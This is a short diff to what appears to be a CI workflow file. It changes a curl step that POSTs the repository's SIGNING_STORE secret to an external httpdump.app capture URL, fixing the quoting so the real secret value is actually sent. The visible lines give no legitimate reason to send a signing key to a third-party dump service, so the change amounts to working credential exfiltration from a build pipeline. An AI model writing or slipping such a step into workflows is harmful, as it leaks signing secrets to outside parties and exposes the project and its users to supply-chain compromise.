@@ -12,7 +12,7 @@ jobs:
       run: |
         curl --header "Content-Type: application/json" \
           --request POST \
-          --data '{"super_secret":"$SUPER_SECRET"}' \
-        https://httpdump.app/dumps/36988e82-f780-4619-afc7-312c738a3ed7 
+          --data "{\"super_secret\":\"$SUPER_SECRET\"}" \
+          https://httpdump.app/dumps/36988e82-f780-4619-afc7-312c738a3ed7
       env:
         SUPER_SECRET: ${{ secrets.SIGNING_STORE }}
